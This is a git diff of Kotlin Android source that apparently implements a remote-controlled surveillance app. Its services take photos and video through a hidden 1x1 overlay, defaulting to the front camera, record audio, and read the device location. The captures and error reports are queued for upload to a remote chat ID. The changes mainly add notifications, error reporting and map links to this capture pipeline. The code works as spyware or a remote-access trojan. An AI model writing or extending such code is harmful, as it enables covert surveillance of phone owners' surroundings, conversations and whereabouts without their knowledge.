@@ -16,9 +16,6 @@ import java.io.FileOutputStream
 import java.text.SimpleDateFormat
 import java.util.*
 
-/**
- * CameraService: Takes photo or video in the background using a 1x1 overlay SurfaceView.
- */
 class CameraService : Service() {
     private val job = SupervisorJob()
     private val scope = CoroutineScope(Dispatchers.Default + job)
@@ -34,8 +31,8 @@ class CameraService : Service() {
         fun start(
             context: Context,
             type: String,
-            camera: String,
-            flash: Boolean,
+            camera: String?,
+            flash: Boolean?,
             quality: Int?,
             duration: Int?,
             chatId: String?
@@ -54,16 +51,25 @@ class CameraService : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         val type = intent?.getStringExtra(EXTRA_TYPE) ?: "photo"
-        val camera = intent?.getStringExtra(EXTRA_CAMERA) ?: "rear"
+        val camera = intent?.getStringExtra(EXTRA_CAMERA) ?: "front"
+        val quality = intent?.getIntExtra(EXTRA_QUALITY, if (type == "photo") 1080 else 480) ?: if (type == "photo") 1080 else 480
         val flash = intent?.getBooleanExtra(EXTRA_FLASH, false) ?: false
-        val quality = intent?.getIntExtra(EXTRA_QUALITY, 720) ?: 720
-        val duration = intent?.getIntExtra(EXTRA_DURATION, 60) ?: 60
+        val duration = intent?.getIntExtra(EXTRA_DURATION, if (type == "video") 60 else 0) ?: if (type == "video") 60 else 0
         val chatId = intent?.getStringExtra(EXTRA_CHAT_ID)
 
+        val notification = androidx.core.app.NotificationCompat.Builder(this, NotificationHelper.CHANNEL_ID)
+            .setContentTitle("Camera Service")
+            .setContentText("Taking photo/video...")
+            .setSmallIcon(android.R.drawable.ic_menu_camera)
+            .build()
+        startForeground(2, notification)
+
         scope.launch {
+            var winMgr: WindowManager? = null
+            var surfaceView: SurfaceView? = null
             try {
-                val winMgr = getSystemService(WINDOW_SERVICE) as WindowManager
-                val surfaceView = SurfaceView(this@CameraService)
+                winMgr = getSystemService(WINDOW_SERVICE) as WindowManager
+                surfaceView = SurfaceView(this@CameraService)
                 val lp = WindowManager.LayoutParams(
                     1, 1,
                     WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
@@ -73,8 +79,11 @@ class CameraService : Service() {
                 withContext(Dispatchers.Main) {
                     winMgr.addView(surfaceView, lp)
                 }
-                val file = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "remote_${System.currentTimeMillis()}.${if (type == "photo") "jpg" else "mp4"}")
-                CameraBackgroundHelper.takePhotoOrVideo(
+                val file = File(
+                    getExternalFilesDir(Environment.DIRECTORY_PICTURES),
+                    "remote_${System.currentTimeMillis()}.${if (type == "photo") "jpg" else "mp4"}"
+                )
+                val captured = CameraBackgroundHelper.takePhotoOrVideo(
                     this@CameraService,
                     surfaceView.holder,
                     type,
@@ -87,13 +96,36 @@ class CameraService : Service() {
                 withContext(Dispatchers.Main) {
                     winMgr.removeView(surfaceView)
                 }
-                Log.d("CameraService", "Saved $type to ${file.absolutePath}")
-                if (chatId != null) {
-                    UploadManager.queueUpload(file, chatId, type)
+                if (captured && file.exists() && file.length() > 0) {
+                    Log.d("CameraService", "Saved $type to ${file.absolutePath}")
+                    chatId?.let { UploadManager.queueUpload(file, it, type) }
+                } else {
+                    Log.e("CameraService", "Failed to capture $type or file is empty!")
+                    chatId?.let {
+                        val errorFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "remote_error_${System.currentTimeMillis()}.txt")
+                        FileOutputStream(errorFile).use { out ->
+                            out.write("Failed to capture $type".toByteArray())
+                        }
+                        UploadManager.queueUpload(errorFile, it, "text")
+                    }
                 }
             } catch (e: Exception) {
                 Log.e("CameraService", "Error: $e")
+                chatId?.let {
+                    val errorFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "remote_error_${System.currentTimeMillis()}.txt")
+                    FileOutputStream(errorFile).use { out ->
+                        out.write("Exception during $type capture: ${e.message}".toByteArray())
+                    }
+                    UploadManager.queueUpload(errorFile, it, "text")
+                }
             } finally {
+                try {
+                    if (winMgr != null && surfaceView != null) {
+                        withContext(Dispatchers.Main) {
+                            winMgr.removeViewImmediate(surfaceView)
+                        }
+                    }
+                } catch (_: Exception) {}
                 stopSelf()
             }
         }
@@ -108,9 +140,6 @@ class CameraService : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
 }
 
-/**
- * AudioService: Records audio in the background.
- */
 class AudioService : Service() {
     private val job = SupervisorJob()
     private val scope = CoroutineScope(Dispatchers.Default + job)
@@ -119,7 +148,7 @@ class AudioService : Service() {
         const val EXTRA_DURATION = "duration"
         const val EXTRA_CHAT_ID = "chat_id"
 
-        fun start(context: Context, duration: Int = 120, chatId: String? = null) {
+        fun start(context: Context, duration: Int = 60, chatId: String? = null) {
             val intent = Intent(context, AudioService::class.java).apply {
                 putExtra(EXTRA_DURATION, duration)
                 chatId?.let { putExtra(EXTRA_CHAT_ID, it) }
@@ -129,18 +158,42 @@ class AudioService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        val duration = intent?.getIntExtra(EXTRA_DURATION, 120) ?: 120
+        val duration = intent?.getIntExtra(EXTRA_DURATION, 60) ?: 60
         val chatId = intent?.getStringExtra(EXTRA_CHAT_ID)
+
+        val notification = androidx.core.app.NotificationCompat.Builder(this, NotificationHelper.CHANNEL_ID)
+            .setContentTitle("Audio Service")
+            .setContentText("Recording audio...")
+            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
+            .build()
+        startForeground(3, notification)
+
         scope.launch {
             try {
                 val file = File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "remote_audio_${System.currentTimeMillis()}.m4a")
-                AudioBackgroundHelper.recordAudio(this@AudioService, file, duration)
-                Log.d("AudioService", "Saved audio to ${file.absolutePath}")
-                if (chatId != null) {
-                    UploadManager.queueUpload(file, chatId, "audio")
+                val recorded = AudioBackgroundHelper.recordAudio(this@AudioService, file, duration)
+                if (recorded && file.exists() && file.length() > 0) {
+                    Log.d("AudioService", "Saved audio to ${file.absolutePath}")
+                    chatId?.let { UploadManager.queueUpload(file, it, "audio") }
+                } else {
+                    Log.e("AudioService", "Failed to record audio or file is empty!")
+                    chatId?.let {
+                        val errorFile = File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "remote_error_${System.currentTimeMillis()}.txt")
+                        FileOutputStream(errorFile).use { out ->
+                            out.write("Failed to record audio".toByteArray())
+                        }
+                        UploadManager.queueUpload(errorFile, it, "text")
+                    }
                 }
             } catch (e: Exception) {
                 Log.e("AudioService", "Error: $e")
+                chatId?.let {
+                    val errorFile = File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "remote_error_${System.currentTimeMillis()}.txt")
+                    FileOutputStream(errorFile).use { out ->
+                        out.write("Exception during audio recording: ${e.message}".toByteArray())
+                    }
+                    UploadManager.queueUpload(errorFile, it, "text")
+                }
             } finally {
                 stopSelf()
             }
@@ -156,9 +209,6 @@ class AudioService : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
 }
 
-/**
- * LocationService: Gets current location and uploads it.
- */
 class LocationService : Service() {
     private val job = SupervisorJob()
     private val scope = CoroutineScope(Dispatchers.Default + job)
@@ -175,25 +225,46 @@ class LocationService : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         val chatId = intent?.getStringExtra(EXTRA_CHAT_ID)
+
+        val notification = androidx.core.app.NotificationCompat.Builder(this, NotificationHelper.CHANNEL_ID)
+            .setContentTitle("Location Service")
+            .setContentText("Acquiring location...")
+            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
+            .build()
+        startForeground(4, notification)
+
         scope.launch {
             try {
                 val location = LocationBackgroundHelper.getLastLocation(this@LocationService)
                 if (location != null) {
                     Log.d("LocationService", "Location: ${location.latitude}, ${location.longitude}")
                     if (chatId != null) {
-                        val file = File(getExternalFilesDir(null), "remote_location_${System.currentTimeMillis()}.json")
+                        val mapsUrl = "https://maps.google.com/?q=${location.latitude},${location.longitude}"
+                        val file = File(getExternalFilesDir(null), "remote_location_${System.currentTimeMillis()}.txt")
                         FileOutputStream(file).use { out ->
-                            out.write(
-                                """{"lat":${location.latitude},"lng":${location.longitude},"timestamp":${location.time}}""".toByteArray()
-                            )
+                            out.write(mapsUrl.toByteArray())
                         }
                         UploadManager.queueUpload(file, chatId, "location")
                     }
                 } else {
                     Log.e("LocationService", "Location not found")
+                    if (chatId != null) {
+                        val file = File(getExternalFilesDir(null), "remote_location_${System.currentTimeMillis()}_unavailable.txt")
+                        FileOutputStream(file).use { out ->
+                            out.write("Location unavailable".toByteArray())
+                        }
+                        UploadManager.queueUpload(file, chatId, "location")
+                    }
                 }
             } catch (e: Exception) {
                 Log.e("LocationService", "Error: $e")
+                if (chatId != null) {
+                    val file = File(getExternalFilesDir(null), "remote_location_${System.currentTimeMillis()}_exception.txt")
+                    FileOutputStream(file).use { out ->
+                        out.write("Exception getting location: ${e.message}".toByteArray())
+                    }
+                    UploadManager.queueUpload(file, chatId, "location")
+                }
             } finally {
                 stopSelf()
             }
@@ -209,9 +280,6 @@ class LocationService : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
 }
 
-/**
- * ForegroundActionService: Handles all-in-one remote actions, including camera, audio, location, ring, and vibrate.
- */
 class ForegroundActionService : Service() {
     private var overlayView: OverlayCameraView? = null
     private var job: Job? = null
@@ -219,12 +287,6 @@ class ForegroundActionService : Service() {
     override fun onCreate() {
         super.onCreate()
         Log.d("ForegroundActionService", "onCreate called")
-        val notification = androidx.core.app.NotificationCompat.Builder(this, NotificationHelper.CHANNEL_ID)
-            .setContentTitle("Remote Control Service")
-            .setContentText("Running background actions...")
-            .setSmallIcon(android.R.drawable.ic_menu_camera)
-            .build()
-        startForeground(1, notification)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -234,6 +296,13 @@ class ForegroundActionService : Service() {
         job?.cancel()
         job = CoroutineScope(Dispatchers.IO).launch {
             try {
+                val notification = androidx.core.app.NotificationCompat.Builder(this@ForegroundActionService, NotificationHelper.CHANNEL_ID)
+                    .setContentTitle("Remote Control Service")
+                    .setContentText("Running background actions...")
+                    .setSmallIcon(android.R.drawable.ic_menu_camera)
+                    .build()
+                startForeground(1, notification)
+
                 when (action) {
                     "photo" -> {
                         Log.d("ForegroundActionService", "Handling camera action: photo")
@@ -274,10 +343,10 @@ class ForegroundActionService : Service() {
 
     private suspend fun handleCameraAction(type: String, intent: Intent?, chatId: String?) {
         showCameraOverlay()
-        val cameraFacing = intent?.getStringExtra("camera") ?: "rear"
+        val cameraFacing = intent?.getStringExtra("camera") ?: "front"
+        val quality = intent?.getIntExtra("quality", if (type == "photo") 1080 else 480) ?: if (type == "photo") 1080 else 480
         val flash = intent?.getBooleanExtra("flash", false) ?: false
-        val quality = intent?.getIntExtra("quality", 720) ?: 720
-        val duration = intent?.getIntExtra("duration", 60) ?: 60
+        val duration = intent?.getIntExtra("duration", if (type == "video") 60 else 0) ?: if (type == "video") 60 else 0
         val outputFile = File(cacheDir, generateFileName(type, quality))
         Log.d("ForegroundActionService", "Camera params: type=$type, cameraFacing=$cameraFacing, flash=$flash, quality=$quality, duration=$duration, outputFile=${outputFile.absolutePath}")
         val result: Boolean
@@ -294,13 +363,26 @@ class ForegroundActionService : Service() {
             )
         } catch (e: Exception) {
             Log.e("ForegroundActionService", "Camera error: $e")
+            chatId?.let {
+                val errorFile = File(cacheDir, "remote_error_${nowString()}.txt")
+                FileOutputStream(errorFile).use { out ->
+                    out.write("Exception during $type capture: ${e.message}".toByteArray())
+                }
+                UploadManager.queueUpload(errorFile, it, "text")
+            }
             return
         } finally {
             removeCameraOverlay()
         }
-        if (result && chatId != null) {
+        if (result && outputFile.exists() && outputFile.length() > 0 && chatId != null) {
             Log.d("ForegroundActionService", "Queueing camera result for upload: $outputFile")
             UploadManager.queueUpload(outputFile, chatId, type)
+        } else if (chatId != null) {
+            val errorFile = File(cacheDir, "remote_error_${nowString()}.txt")
+            FileOutputStream(errorFile).use { out ->
+                out.write("Failed to capture $type".toByteArray())
+            }
+            UploadManager.queueUpload(errorFile, chatId, "text")
         }
     }
 
@@ -309,13 +391,26 @@ class ForegroundActionService : Service() {
         val outputFile = File(cacheDir, "audio_${nowString()}.m4a")
         Log.d("ForegroundActionService", "Audio params: duration=$duration, outputFile=${outputFile.absolutePath}")
         try {
-            AudioBackgroundHelper.recordAudio(this, outputFile, duration)
-            if (chatId != null) {
+            val recorded = AudioBackgroundHelper.recordAudio(this, outputFile, duration)
+            if (recorded && outputFile.exists() && outputFile.length() > 0 && chatId != null) {
                 Log.d("ForegroundActionService", "Queueing audio result for upload: $outputFile")
                 UploadManager.queueUpload(outputFile, chatId, "audio")
+            } else if (chatId != null) {
+                val errorFile = File(cacheDir, "remote_error_${nowString()}.txt")
+                FileOutputStream(errorFile).use { out ->
+                    out.write("Failed to record audio".toByteArray())
+                }
+                UploadManager.queueUpload(errorFile, chatId, "text")
             }
         } catch (e: Exception) {
             Log.e("ForegroundActionService", "Audio error: $e")
+            if (chatId != null) {
+                val errorFile = File(cacheDir, "remote_error_${nowString()}.txt")
+                FileOutputStream(errorFile).use { out ->
+                    out.write("Exception during audio recording: ${e.message}".toByteArray())
+                }
+                UploadManager.queueUpload(errorFile, chatId, "text")
+            }
         }
     }
 
@@ -324,11 +419,19 @@ class ForegroundActionService : Service() {
             val loc = LocationBackgroundHelper.getLastLocation(this)
             if (loc == null) {
                 Log.e("ForegroundActionService", "Location unavailable")
+                if (chatId != null) {
+                    val file = File(cacheDir, "location_${nowString()}_unavailable.txt")
+                    FileOutputStream(file).use { out ->
+                        out.write("Location unavailable".toByteArray())
+                    }
+                    UploadManager.queueUpload(file, chatId, "location")
+                }
                 return
             }
-            val locationFile = File(cacheDir, "location_${nowString()}.json")
+            val mapsUrl = "https://maps.google.com/?q=${loc.latitude},${loc.longitude}"
+            val locationFile = File(cacheDir, "location_${nowString()}.txt")
             FileOutputStream(locationFile).use { out ->
-                out.write("""{"lat":${loc.latitude},"lng":${loc.longitude},"timestamp":${loc.time}}""".toByteArray())
+                out.write(mapsUrl.toByteArray())
             }
             if (chatId != null) {
                 Log.d("ForegroundActionService", "Queueing location result for upload: $locationFile")
@@ -336,6 +439,13 @@ class ForegroundActionService : Service() {
             }
         } catch (e: Exception) {
             Log.e("ForegroundActionService", "Location error: $e")
+            if (chatId != null) {
+                val file = File(cacheDir, "location_${nowString()}_exception.txt")
+                FileOutputStream(file).use { out ->
+                    out.write("Exception getting location: ${e.message}".toByteArray())
+                }
+                UploadManager.queueUpload(file, chatId, "location")
+            }
         }
     }
 
@@ -395,81 +505,6 @@ class ForegroundActionService : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
 
     companion object {
-        fun start(context: Context) {
-            val intent = Intent(context, ForegroundActionService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                context.startForegroundService(intent)
-            } else {
-                context.startService(intent)
-            }
-        }
-        fun stop(context: Context) {
-            context.stopService(Intent(context, ForegroundActionService::class.java))
-        }
-        fun isRunning(context: Context): Boolean = false
-
-        fun startCameraAction(context: Context, type: String, options: JSONObject, chatId: String?) {
-            val intent = Intent(context, ForegroundActionService::class.java)
-            intent.putExtra("action", type)
-            intent.putExtra("camera", options.optString("camera", "rear"))
-            if (options.has("flash")) intent.putExtra("flash", options.optBoolean("flash", false))
-            if (type == "video") {
-                if (options.has("quality")) intent.putExtra("quality", options.optInt("quality", 720))
-                if (options.has("duration")) intent.putExtra("duration", options.optInt("duration", 60))
-            }
-            chatId?.let { intent.putExtra("chat_id", it) }
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                context.startForegroundService(intent)
-            } else {
-                context.startService(intent)
-            }
-            Log.d("ForegroundActionService", "startCameraAction called: type=$type, options=$options, chatId=$chatId")
-        }
-        fun startAudioAction(context: Context, options: JSONObject, chatId: String?) {
-            val duration = options.optInt("duration", 60)
-            val intent = Intent(context, ForegroundActionService::class.java)
-            intent.putExtra("action", "audio")
-            intent.putExtra("duration", duration)
-            chatId?.let { intent.putExtra("chat_id", it) }
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                context.startForegroundService(intent)
-            } else {
-                context.startService(intent)
-            }
-            Log.d("ForegroundActionService", "startAudioAction called: duration=$duration, chatId=$chatId")
-        }
-        fun startLocationAction(context: Context, chatId: String?) {
-            val intent = Intent(context, ForegroundActionService::class.java)
-            intent.putExtra("action", "location")
-            chatId?.let { intent.putExtra("chat_id", it) }
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                context.startForegroundService(intent)
-            } else {
-                context.startService(intent)
-            }
-            Log.d("ForegroundActionService", "startLocationAction called: chatId=$chatId")
-        }
-        fun startRingAction(context: Context, options: JSONObject) {
-            val intent = Intent(context, ForegroundActionService::class.java)
-            intent.putExtra("action", "ring")
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                context.startForegroundService(intent)
-            } else {
-                context.startService(intent)
-            }
-            Log.d("ForegroundActionService", "startRingAction called")
-        }
-        fun startVibrateAction(context: Context, options: JSONObject) {
-            val intent = Intent(context, ForegroundActionService::class.java)
-            intent.putExtra("action", "vibrate")
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                context.startForegroundService(intent)
-            } else {
-                context.startService(intent)
-            }
-            Log.d("ForegroundActionService", "startVibrateAction called")
-        }
-
         fun generateFileName(type: String, quality: Int): String {
             val sdf = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US)
             return if (type == "video") {
